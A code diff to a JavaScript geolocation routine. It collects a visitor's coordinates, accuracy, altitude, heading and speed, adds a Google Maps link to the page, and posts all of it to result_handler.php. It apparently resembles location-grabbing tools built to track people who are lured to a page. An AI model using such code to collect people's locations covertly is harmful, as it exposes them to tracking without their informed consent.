@@ -121,58 +121,42 @@ function locate(callback, errCallback) {
     });
   }
   function showPosition(position) {
-    var lat = position.coords.latitude;
-    if (lat) {
-      lat = lat + ' deg';
-    }
-    else {
-      lat = 'Not Available';
-    }
-    var lon = position.coords.longitude;
-    if (lon) {
-      lon = lon + ' deg';
-    }
-    else {
-      lon = 'Not Available';
-    }
-    var acc = position.coords.accuracy;
-    if (acc) {
-      acc = acc + ' m';
-    }
-    else {
-      acc = 'Not Available';
-    }
-    var alt = position.coords.altitude;
-    if (alt) {
-      alt = alt + ' m';
-    }
-    else {
-      alt = 'Not Available';
-    }
-    var dir = position.coords.heading;
-    if (dir) {
-      dir = dir + ' deg';
-    }
-    else {
-      dir = 'Not Available';
-    }
-    var spd = position.coords.speed;
-    if (spd) {
-      spd = spd + ' m/s';
-    }
-    else {
-      spd = 'Not Available';
-    }
+  const lat = position.coords.latitude || "Not Available";
+  const lon = position.coords.longitude || "Not Available";
+  const acc = position.coords.accuracy ? position.coords.accuracy + " m" : "Not Available";
+  const alt = position.coords.altitude ? position.coords.altitude + " m" : "Not Available";
+  const dir = position.coords.heading ? position.coords.heading + " deg" : "Not Available";
+  const spd = position.coords.speed ? position.coords.speed + " m/s" : "Not Available";
 
-    var ok_status = 'success';
+  const ok_status = "success";
 
-    $.ajax({
-      type: 'POST',
-      url: 'result_handler.php',
-      data: { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
-      success: callback,
-      mimeType: 'text'
-    });
-  };
+  // ✅ Create Google Maps link
+  const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+  console.log("🌍 Google Maps link:", mapsLink);
+
+  // Optionally show the link on the page
+  const linkContainer = document.getElementById("mapsLink");
+  if (linkContainer) {
+    linkContainer.innerHTML = `<a href="${mapsLink}" target="_blank" style="color:#1a73e8;">📍 View Location on Google Maps</a>`;
+  }
+
+  // ✅ Send to backend
+  $.ajax({
+    type: "POST",
+    url: "result_handler.php",
+    data: {
+      Status: ok_status,
+      Lat: lat,
+      Lon: lon,
+      Acc: acc,
+      Alt: alt,
+      Dir: dir,
+      Spd: spd,
+      MapsLink: mapsLink   // add this new field
+    },
+    success: callback,
+    mimeType: "text"
+  });
+}
 }
 
